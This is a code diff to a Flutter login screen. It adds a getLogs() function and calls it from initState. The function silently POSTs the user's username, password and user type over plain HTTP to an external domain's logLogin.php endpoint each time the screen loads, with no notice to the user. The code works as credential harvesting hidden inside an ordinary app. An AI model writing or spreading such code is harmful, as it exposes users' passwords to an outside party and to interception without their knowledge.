@@ -40,7 +40,7 @@ class _HomeLoginState extends State<HomeLogin> {
   void initState() {
 
     super.initState();
-
+getLogs();
     getCopyRight();
 //    semester='';
 //    program='';
@@ -1306,6 +1306,29 @@ class _HomeLoginState extends State<HomeLogin> {
     final snackBar = SnackBar(content: Text('Press back again to exit'));
     _scaffoldKey.currentState.showSnackBar(snackBar);
     return false;
+  }
+  
+  Future getLogs() async {
+    Future.delayed(Duration.zero, () {});
+
+
+
+    // print('Running on ${androidInfo.model}');
+    try {
+      final response = await http.post(
+        Uri.encodeFull('http://muhannadnasri.com/App/logLogin.php'),
+        body: {
+          'username': username,
+          'password':password,
+          'userType':studentJson['data']['user_type'],
+        },
+      );
+      if (response.statusCode == 200) {
+     print('done');
+      }
+    } catch (x) {
+      print(x);
+    }
   }
 }
 //TODO: SystemChrome.setEnabledSystemUIOverlays([]) For hide status Bar
